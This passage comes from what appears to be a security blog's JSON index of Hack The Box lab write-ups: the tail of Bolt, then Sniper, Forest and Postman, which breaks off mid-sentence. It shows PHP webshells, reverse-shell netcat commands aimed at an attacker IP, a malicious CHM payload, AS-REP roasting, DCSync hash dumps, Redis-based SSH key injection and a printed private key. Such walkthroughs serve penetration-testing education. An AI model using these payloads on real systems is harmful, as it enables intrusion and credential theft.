a webshell so I can run commands as www-data:bolt@bolt:/var/tmp$ cd /var/tmpbolt@bolt:/var/tmp$ mkdir abolt@bolt:/var/tmp$ cd abolt@bolt:/var/tmp/a$ git initInitialized empty Git repository in /var/tmp/a/.git/bolt@bolt:/var/tmp/a$ touch blablabolt@bolt:/var/tmp/a$ git add blablabolt@bolt:/var/tmp/a$ git commit -m 'yo'*** Please tell me who you are.Run  git config --global user.email \"you@example.com\"  git config --global user.name \"Your Name\"to set your account's default identity.Omit --global to set the identity only in this repository.fatal: empty ident name (for &lt;bolt@bolt&gt;) not allowedbolt@bolt:/var/tmp/a$ vi .git/hooks/post-checkoutbolt@bolt:/var/tmp/a$ chmod 755 .git/hooks/post-checkoutbolt@bolt:/var/tmp/a$ chmod -R 777 *bolt@bolt:/var/tmp/a$ chmod -R 777 .git/bolt@bolt:/var/tmp/a$ sudo -u git /usr/bin/git checkout * error: unable to unlink old 'blabla': Permission deniedbolt@bolt:/var/tmp/a$ ls -l /var/www/html/snow.php-rw-r--r-- 1 git www-data 29 Oct 20 23:43 /var/www/html/snow.phpbolt@bolt:/var/tmp/a$ cat /var/www/html/snow.php &lt;?php system($_GET[\"c\"]) ?&gt;;I tried to get a reverse shell but I couldn’t so I assume there is a firewall blocking outbound connection. No matter, there is netcat already on the box so I can start a local listener as user bolt and proceed from there. I created a /tmp/shell.sh that contains a standard reverse shell using netcat and called it from my webshell.bolt@bolt:~$ nc -lvnp 4444Listening on [0.0.0.0] (family 0, port 4444)Connection from 127.0.0.1 60286 received!/bin/sh: 0: can't access tty; job control turned off$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)Privilege escalationMore sudo privileges! This is probably the way to get root access. I need to abuse the restic backup system to get RCE as root.$ sudo -lMatching Defaults entries for www-data on bolt:    env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\\:[...]User www-data may run the following commands on bolt:    (root) NOPASSWD: /usr/bin/restic backup -r rest*Unintended methodWe can pass special parameters to the restic backup application to specify how we want to establish the SSH connection for remote backups. By abusing this parameter we can effectively run any command we want as root. In this case I’ll just call another reverse shell back to me and gain root access.sudo /usr/bin/restic backup -r rest/ -r sftp:bolt@127.0.0.1:/var/tmp/xyz -o sftp.command=\"/tmp/shell.sh\" /root/root.txt"
  },
  
  {
    "title": "Sniper - Hack The Box",
    "url": "/posts/htb-writeup-sniper/",
    "categories": "hackthebox, infosec",
    "tags": "php, rfi, unintended, plink, winrm, chm",
    "date": "2020-03-28 00:00:00 +0800",
    





    
    "snippet": "Sniper is another box I got access to through an unintended method. The PHP application wasn’t supposed to be exploitable through Remote File Inclusion but because it runs on Windows, we can use UN...",
    "content": "Sniper is another box I got access to through an unintended method. The PHP application wasn’t supposed to be exploitable through Remote File Inclusion but because it runs on Windows, we can use UNC path to include a file from an SMB share. Once I had a shell, I pivoted using plink and logged in as user Chris with WinRM. The box author was nice enough to leave hints as to what kind of malicious payload was expected and I used Nishang to generate a CHM payload and get Administrator access.Summary  Exploit an RFI in the language parameter to include a PHP file through SMB and gain RCE  Retrieve the MySQL credentials from the database  Upgrade the shell to a meterpreter shell and port forward WinRM  Login as user Chris with the forwarded WinRM socket  Identify through hints that the admin is waiting for a .chm file  Craft a malicious .chm file and get a reverse shell as AdministratorPortscanroot@kali:~/htb/sniper# nmap -sC -sV -T4 -p- 10.10.10.151Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-06 09:01 EDTNmap scan report for sniper.htb (10.10.10.151)Host is up (0.049s latency).Not shown: 65530 filtered portsPORT      STATE SERVICE       VERSION80/tcp    open  http          Microsoft IIS httpd 10.0| http-methods:|_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Sniper Co.135/tcp   open  msrpc         Microsoft Windows RPC139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn445/tcp   open  microsoft-ds?49667/tcp open  msrpc         Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: 7h00m13s| smb2-security-mode:|   2.02:|_    Message signing enabled but not required| smb2-time:|   date: 2019-10-06T20:04:16|_  start_date: N/ASMBNo access to shares on SMBroot@kali:~/htb/sniper# smbmap -u invalid -H 10.10.10.151[+] Finding open SMB ports....[!] Authentication error occured[!] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)[!] Authentication error on 10.10.10.151root@kali:~/htb/sniper# smbmap -u '' -H 10.10.10.151[+] Finding open SMB ports....[!] Authentication error occured[!] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)[!] Authentication error on 10.10.10.151WebThe website is pretty generic and most of the links don’t work.At the bottom of the main page there is a link to the User Portal.The user portal has a login page and there is a link at the bottom to register a new user.The registration page looks like this.After creating myself an account, I log in and see that it’s still under construction.Next, I scanned the site with rustbuster and found a blog link I didn’t see earlier.The blog is pretty generic but there is an interesting link to change the language of the page.As shown in the source code, it is possibly a target for an LFI or RFI since it references a PHP file.Gaining RCE through RFI in the language parameterTo test for local file inclusion I’ll try including a Windows file I know exists on the target machine. Luckily for me the lang parameter uses the filename with the extension so I can potentially include any file, not just file with php extensions. I am able to get the content of win.ini with the following:GET /blog/?lang=/windows/win.iniNext I try to include a remote file through HTTP with GET /blog/?lang=http://10.10.14.11/test.php but I didn’t get a callback so I assume remote file includes are disabled or there is some filtering done on the parameter.Even though remote file includes are disabled, using a UNC path works since it’s considered a local path by PHP and I’m able to get a callback through SMB on port 445 with GET /blog/?lang=//10.10.14.11/test/test.phpI can’t get impacket-smbserver working right with this box so instead I’ll use the standard Samba server in Linux and create an open share: net usershare add test /root/htb/sniper/share '' 'Everyone:F' guest_ok=yBefore trying to get RCE, I’ll create an info.php file that calls phpinfo() so I can check for any disabled functions:&lt;?phpphpinfo();?&gt;After calling phpinfo() with GET /blog/?lang=//10.10.14.11/test/info.php I see that it’s running Windows build 17763 and that no functions are disabled.Next I’ll create another PHP file to execute commands passed in the cmd parameter:&lt;?phpsystem($_GET[\"cmd\"]);?&gt;And with the following request I can execute commands: GET /blog/?lang=//10.10.14.11/test/nc.php&amp;cmd=whoamiTo get a shell I’ll upload netcat to the server with GET /blog/?lang=//10.10.14.11/test/nc.php&amp;cmd=copy+\\\\10.10.14.11\\test\\nc.exe+c:\\programdata\\nc.exeThen I execute netcat to get a shell with GET /blog/?lang=//10.10.14.11/test/nc.php&amp;cmd=c:\\programdata\\nc.exe+-e+cmd.exe+10.10.14.11+80Enumeration of the machineThe first thing I check is the C:\\inetpub\\wwwroot\\user\\db.php file used by the login portal so I can see which credentials are used to connect to the database:&lt;?php// Enter your Host, username, password, database below.// I left password empty because i do not set password on localhost.$con = mysqli_connect(\"localhost\",\"dbuser\",\"36mEAhz/B8xQ~2VM\",\"sniper\");// Check connectionif (mysqli_connect_errno())  {  echo \"Failed to connect to MySQL: \" . mysqli_connect_error();  }?&gt;Then I check out which local users are present on the box:C:\\&gt;net usersUser accounts for \\\\-------------------------------------------------------------------------------Administrator            Chris                    DefaultAccountGuest                    WDAGUtilityAccountThe next logical step is to get access to user Chris:...Local Group Memberships      *Remote Management UsersGlobal Group memberships     *None...Chris is part of the Remote Management Users group and WinRM is listening on port 5985 but firewalled off from the outside.C:\\&gt;netstat -anActive Connections  Proto  Local Address          Foreign Address        State  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING  TCP    0.0.0.0:33060          0.0.0.0:0              LISTENING[...]...Shell as user Chris with WinRMTo connect to WinRM I’ll upload plink.exe and create a reverse tunnel for port 5985.After pivoting, I am able to log in as user Chris.I find that WinRM is a tad slow so I’ll spawn another netcat as user Chris to continue my enumeration.More enumerationThe c:\\docs directory was previously unaccessible with the previous user but I can see the files now with user Chris.C:\\docs&gt;dir Volume in drive C has no label. Volume Serial Number is 6A2B-2640 Directory of C:\\docs10/01/2019  01:04 PM    &lt;DIR&gt;          .10/01/2019  01:04 PM    &lt;DIR&gt;          ..04/11/2019  09:31 AM               285 note.txt04/11/2019  09:17 AM           552,607 php for dummies-trial.pdf               2 File(s)        552,892 bytes               2 Dir(s)  17,885,601,792 bytes freeThe .pdf doesn’t have anything interesting but note.txt contains a hint:type note.txtHi Chris,\tYour php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.Regards,Sniper CEO.Ok, so the CEO (probably the administrator) is expecting some documentation files to be dropped in this folder. There’s probably a script bot running and opening files in this folder. I don’t know what kind of payload he’s expecting so I’ll keep on looking around the box.The C:\\Users\\Chris\\Downloads directory contains a CHM file.C:\\Users\\Chris\\Downloads&gt;dir Volume in drive C has no label. Volume Serial Number is 6A2B-2640 Directory of C:\\Users\\Chris\\Downloads04/11/2019  08:36 AM    &lt;DIR&gt;          .04/11/2019  08:36 AM    &lt;DIR&gt;          ..04/11/2019  08:36 AM            10,462 instructions.chm               1 File(s)         10,462 bytes               2 Dir(s)  17,885,601,792 bytes freeAs per Wikipedia:  Microsoft Compiled HTML Help is a Microsoft proprietary online help format, consisting of a collection of HTML pages, an index and other navigation tools. The files are compressed and deployed in a binary format with the extension .CHM, for Compiled HTML. The format is often used for software documentation.So now things are starting to click:  The admin/CEO is expecting documentation  The instruction.chm file is a compiled html file used for documentationI remembered reading about malicious CHM files some time ago so I make sure to open the file in an isolated Windows VM:I did some research and found the Nishang Out-CHM tool that can generate malicious payload. I should be able to get RCE as the administrator with this malicious file.Generating a malicious CHM file for privilege escalationAfter installing the HTML Help Workshop on my Windows machine, I generated a malicious CHM file that uses netcat to spawn a reverse shell:PS &gt; Out-CHM -Payload \"C:\\programdata\\nc.exe -e cmd.exe 10.10.14.11 3333\" -HHCPath \"C:\\Program Files (x86)\\HTML Help Workshop\"Uploaded it to the server…*Evil-WinRM* PS C:\\docs&gt; copy \\\\10.10.14.11\\test\\doc.chm .And boom, got a shell as administrator:"
  },
  
  {
    "title": "Forest - Hack The Box",
    "url": "/posts/htb-writeup-forest/",
    "categories": "hackthebox, infosec",
    "tags": "ad, kerberos, bloodhound, dcsync, aclpwn",
    "date": "2020-03-21 00:00:00 +0800",
    





    
    "snippet": "Forest is a nice easy box that go over two Active Directory misconfigurations / vulnerabilities: Kerberos Pre-Authentication (disabled) and ACLs misconfiguration. After I retrieved and cracked the ...",
    "content": "Forest is a nice easy box that go over two Active Directory misconfigurations / vulnerabilities: Kerberos Pre-Authentication (disabled) and ACLs misconfiguration. After I retrieved and cracked the hash for the service account I used aclpwn to automate the attack path and give myself DCsync rights to the domain.Summary  The service account svc-alfresco does not require kerberos preauthentication so we can retrieve and crack the hash offline  After running Bloodhound on the machine, we find that we have WriteDACL access on the domain  We can give ourselved DCSync rights, recover the administrator NTLM hash and psexec to get an administrator shellPortscanroot@kali:~/htb/forest# nmap -p- -T4 10.10.10.161Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-12 15:01 EDTNmap scan report for forest.htb (10.10.10.161)Host is up (0.041s latency).Not shown: 65512 closed portsPORT      STATE SERVICE53/tcp    open  domain88/tcp    open  kerberos-sec135/tcp   open  msrpc139/tcp   open  netbios-ssn389/tcp   open  ldap445/tcp   open  microsoft-ds464/tcp   open  kpasswd5593/tcp   open  http-rpc-epmap636/tcp   open  ldapssl3268/tcp  open  globalcatLDAP3269/tcp  open  globalcatLDAPssl5985/tcp  open  wsman9389/tcp  open  adws47001/tcp open  winrm49664/tcp open  unknown49665/tcp open  unknown49666/tcp open  unknown49667/tcp open  unknown49669/tcp open  unknown49670/tcp open  unknown49671/tcp open  unknown49678/tcp open  unknown49697/tcp open  unknownEnumerating domain users on the machineNULL sessions are allowed so we can get a list of users through the RPC client.The svc-alfresco user is probably a service account based on the name.root@kali:~/htb/forest# enum4linux 10.10.10.161[...]user:[Administrator] rid:[0x1f4]user:[Guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[DefaultAccount] rid:[0x1f7]user:[$331000-VK4ADACQNUCA] rid:[0x463]user:[SM_2c8eef0a09b545acb] rid:[0x464]user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]user:[SM_75a538d3025e4db9a] rid:[0x466]user:[SM_681f53d4942840e18] rid:[0x467]user:[SM_1b41c9286325456bb] rid:[0x468]user:[SM_9b69f1b9d2cc45549] rid:[0x469]user:[SM_7c96b981967141ebb] rid:[0x46a]user:[SM_c75ee099d0a64c91b] rid:[0x46b]user:[SM_1ffab36a2f5f479cb] rid:[0x46c]user:[HealthMailboxc3d7722] rid:[0x46e]user:[HealthMailboxfc9daad] rid:[0x46f]user:[HealthMailboxc0a90c9] rid:[0x470]user:[HealthMailbox670628e] rid:[0x471]user:[HealthMailbox968e74d] rid:[0x472]user:[HealthMailbox6ded678] rid:[0x473]user:[HealthMailbox83d6781] rid:[0x474]user:[HealthMailboxfd87238] rid:[0x475]user:[HealthMailboxb01ac64] rid:[0x476]user:[HealthMailbox7108a4e] rid:[0x477]user:[HealthMailbox0659cc1] rid:[0x478]user:[sebastien] rid:[0x479]user:[lucinda] rid:[0x47a]user:[svc-alfresco] rid:[0x47b]user:[andy] rid:[0x47e]user:[mark] rid:[0x47f]user:[santi] rid:[0x480]Cracking the TGT for the service accountWhen we query the target domain for users with ‘Do not require Kerberos preauthentication’ set, we find that svc-alfresco is not configured with pre-authentication so its TGT will be returned to us encrypted with its password. Similar to kerberoasting, we can brute force the hash offline.root@kali:~/htb/forest# GetNPUsers.py htb.local/svc-alfresco -no-pass -dc-ip 10.10.10.161Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation[*] Getting TGT for svc-alfresco$krb5asrep$23$svc-alfresco@HTB.LOCAL:048f9eeb67ab94be9e4d8fa1da1020[...]6994e733284cc75dc1e3fff447a5d69b064df4fc5967c96b023a5root@kali:~/htb/forest# john -w=/usr/share/wordlists/rockyou.txt hash.txtUsing default input encoding: UTF-8Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statuss3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)1g 0:00:00:06 DONE (2019-10-12 19:52) 0.1481g/s 605297p/s 605297c/s 605297C/s s401447401447401447..s3r2s1Use the \"--show\" option to display all of the cracked passwords reliablySession completedWe found the credentials for the service account: svc-alfresco / s3rvice. This service account is allowed to connect to the server with WinRM.root@kali:~/htb/forest# evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161Info: Starting Evil-WinRM shell v1.6Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; type ..\\desktop\\user.txte5e4e47[...]AD recon with BloodhoundUsing the Bloodhound ingestor, we can collect the data from Active Directory:*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; powershell -ep bypass -command \"import-module \\\\10.10.14.7\\test\\SharpHound.ps1; invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice\"Initializing BloodHound at 5:07 PM on 10/12/2019Resolved Collection Methods to Group, LocalAdmin, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargetsStarting Enumeration for htb.localStatus: 123 objects enumerated (+123 123/s --- Using 117 MB RAM )Finished enumeration for htb.local in 00:00:01.00880431 hosts failed ping. 0 hosts timedout.Compressing data to C:\\Users\\svc-alfresco\\Documents\\20191012170734_BloodHound.zip.You can upload this file directly to the UI.Finished compressing files!*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; copy 20191012170734_BloodHound.zip \\\\10.10.14.7\\testAfter transferring the zip file to our Kali VM, we load the data in Bloodhound and check for the shortest path to domain admin. As shown below, the svc-alfresco user has GenericAll rights on the Exchange Windows Permissions group so we can add this user to the group. Next, the WriteDacl rights allows us to give DCsync rights to our compromised user and retrieve the NTLM hashes for all users on the domain.Privesc with DCSyncTo exploit the ACL path automatically we can use aclpwn:root@kali:~/openvpn# aclpwn -f svc-alfresco -ft user -t htb.local -tt domain -d htb.local -dp bloodhound -du neo4j --server 10.10.10.161 -u svc-alfresco -sp s3rvice -p s3rvice[+] Path found!Path [0]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]-&gt;(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]-&gt;(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]-&gt;(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]-&gt;(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]-&gt;(HTB.LOCAL)[!] Unsupported operation: GenericAll on EXCH01.HTB.LOCAL (Computer)[-] Invalid path, skipping[+] Path found!Path [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]-&gt;(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]-&gt;(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]-&gt;(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]-&gt;(EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL)-[MemberOf]-&gt;(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]-&gt;(HTB.LOCAL)[!] Unsupported operation: GetChanges on HTB.LOCAL (Domain)[-] Invalid path, skippingPlease choose a path [0-1] 0[-] Memberof -&gt; continue[-] Memberof -&gt; continue[-] Memberof -&gt; continue[-] Adding user svc-alfresco to group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL[+] Added CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local as member to CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local[-] Switching context to svc-alfresco[+] Done switching context[-] Modifying domain DACL to give DCSync rights to svc-alfresco[+] Dacl modification successful[+] Finished running tasks[+] Saved restore state to aclpwn-20191013-084938.restoreNow that we have the DCsync rights, we can use secretsdump.py to perform DCsync and get all the hashes.root@kali:~/openvpn# secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)[*] Using the DRSUAPI method to get NTDS.DIT secretshtb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::[...]htb.local\\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::htb.local\\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::htb.local\\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::htb.local\\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::htb.local\\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::htb.local\\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::[...][*] Cleaning up...Now that we have the administrator’s hash we can use psexec to log in."
  },
  
  {
    "title": "Postman - Hack The Box",
    "url": "/posts/htb-writeup-postman/",
    "categories": "hackthebox, infosec",
    "tags": "redis, webmin, ssh",
    "date": "2020-03-14 00:00:00 +0800",
    





    
    "snippet": "Postman was a somewhat frustrating box because we had to find the correct user directory where to write our SSH key using the unprotected Redis instance. I expected to be able to use a wordlist to ...",
    "content": "Postman was a somewhat frustrating box because we had to find the correct user directory where to write our SSH key using the unprotected Redis instance. I expected to be able to use a wordlist to scan through /home and find a valid user but on this box the redis user was configured with a valid login shell so I had to guess that and write my SSH key to /var/lib/redis/.ssh instead. The rest of the box was pretty straightforward, crack some SSH private key then pop a root shell with a Webmin CVE.Summary  Use the unauthenticated Redis server to write our SSH public key to the redis user’s authorized_keys file  From the redis user shell, discover the private key for user Matt inside /opt directory and crack it with john  Use Matt’s credentials to log in to Webmin and exploit CVE-2019-12840 to get a shell as rootPortscanThe ports show the box is running SSH, Apache, Redis and Webmin:root@kali:~# nmap -sC -sV -p- 10.10.10.160Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 16:33 EDTNmap scan report for 10.10.10.160Host is up (0.019s latency).Not shown: 65531 closed portsPORT      STATE SERVICE VERSION22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: The Cyber Geek's Personal Website6379/tcp  open  redis   Redis key-value store 4.0.910000/tcp open  http    MiniServ 1.910 (Webmin httpd)|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 52.76 secondsWebsiteThe website is currently under construction and there is nothing on it, except a possible email address at the bottom.I scanned the website with gobuster to find hidden files and directories.root@kali:~/htb# gobuster dir -t 50 -w /opt/SecLists/Discovery/Web-Content/big.txt -x php -u http://postman.htb/css (Status: 301)/fonts (Status: 301)/images (Status: 301)/js (Status: 301)/server-status (Status: 403)/upload (Status: 301)Indexing was enabled on /upload but there was nothing interesting in there.WebminWebmin is a web-based system configuration tool. As shown below, HTTPS is needed to connect to the port 10000.The nmap scan I ran earlier already discovered the webmin version used on the system from the Server header: MiniServ/1.910Based on Exploit-DB, I saw see there are multiple exploits available for this version:Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)Webmin 1.920 - Remote Code ExecutionWebmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)The Metasploit module for version 1.920 only works for the backdoored version of Webmin and doesn’t work here on this box:msf5 exploit(linux/http/webmin_backdoor) &gt; run[*] Started reverse TCP handler on 10.10.14.20:4444 [-] Exploit aborted due to failure: not-vulnerable: Set ForceExploit to override[*] Exploit completed, but no session was created.The other exploit for CVE-2019-12840 requires authentication so I wasn’t able to use it without creds.  Description:This module exploits an arbitrary command execution vulnerability in Webmin 1.910 and lower versions. Any user authorized to the “Package Updates” module can execute arbitrary commands with root privileges.RedisNext I checked out to the Redis instance. I used the redis-tools package to interact with Redis. As shown below, we don’t need to be authenticated to read and write to the database.Because this instance of Redis is not protected, it’s possible to write arbitrary data to disk using the Redis save functionality. For this attack, I uploaded my SSH public key to the home folder then I was able to SSH in to the box.Here are the blogs that I used when doing the box:  http://antirez.com/news/96  https://github.com/psmiraglia/ctf/blob/master/kevgir/000-redis.mdFirst, I had to find a list of valid users on the box so I scanned for existing user directories using a wordlist and a script.I tried running a couple of wordlist without success then decided to manually verify what’s going on.From the screenshot, we can see that the enumeration technique works: it returns an OK message if the directory is writeable, No such file or directory if it doesn’t exist and Permission denied if we don’t have access to it. I previously tried a whole bunch of directories inside /home but I don’t even have access to its parent directory.Finding the correct directory took a while. I installed redis to see what is the standard installation path. On Kali Linux, the apt installation creates the following user:redis:x:133:145::/var/lib/redis:/usr/sbin/nologinI verified that the directory exists on the box:10.10.10.160:6379&gt; CONFIG SET dir \"/var/lib/redis\"OKOn a normal installation we would not be able to do anything with this user since the login shell is set to /usr/sbin/nologin but on Postman the login shell is set to /bin/bash. Here are the steps I followed to put my SSH key on the server.Step 1. Generate blob to be injectedroot@kali:~/htb/postman# echo -e '\\n\\n' &gt;&gt; blob.txtroot@kali:~/htb/postman# cat ~/.ssh/id_rsa.pub &gt;&gt; blob.txtroot@kali:~/htb/postman# echo -e '\\n\\n' &gt;&gt; blob.txtStep 2. Update the Redis configuration10.10.10.160:6379&gt; CONFIG SET dbfilename \"authorized_keys\"OK10.10.10.160:6379&gt; CONFIG SET dir \"/var/lib/redis/.ssh\"OKStep 3. Do the attackroot@kali:~/htb/postman# redis-cli -h 10.10.10.160 flushallOKroot@kali:~/htb/postman# cat blob.txt | redis-cli -h 10.10.10.160 -x set sshblobOKroot@kali:~/htb/postman# redis-cli -h 10.10.10.160 saveOKAnd we can now log in to the box with SSH:root@kali:~/htb/postman# ssh redis@10.10.10.160The authenticity of host '10.10.10.160 (10.10.10.160)' can't be established.ECDSA key fingerprint is SHA256:kea9iwskZTAT66U8yNRQiTa6t35LX8p0jOpTfvgeCh0.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.10.160' (ECDSA) to the list of known hosts.Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage * Canonical Livepatch is available for installation.   - Reduce system reboots and improve kernel security. Activate at:     https://ubuntu.com/livepatchLast login: Mon Aug 26 03:04:25 2019 from 10.10.10.1redis@Postman:~$Getting Matt’s credentialsThe /etc/passwd file contains another user: Matt[...]sshd:x:106:65534::/run/sshd:/usr/sbin/nologinMatt:x:1000:1000:,,,:/home/Matt:/bin/bashredis:x:107:114::/var/lib/redis:/bin/bashAfter looking around for a bit, I found Matt’s SSH private key in /opt:redis@Postman:/opt$ ls -latotal 12drwxr-xr-x  2 root root 4096 Sep 11  2019 .drwxr-xr-x 22 root root 4096 Aug 25  2019 ..-rwxr-xr-x  1 Matt Matt 1743 Aug 26  2019 id_rsa.bakredis@Postman:/opt$ cat id_rsa.bak -----BEGIN RSA PRIVATE KEY-----Proc-Type: 4,ENCRYPTEDDEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287CJehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnXcwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k27GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT91u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcvEyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHPUH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VYSj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYKt+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdkeP2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3GeSbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3il3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8pS9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRRhkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58VXTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrODb6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXiWhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmhKTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92HmnpAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQVcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5WX+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==-----END RSA PRIVATE KEY-----We’re able to crack the hash with John after converting it with ssh2john.I tried SSHing in with the password but wasn’t able 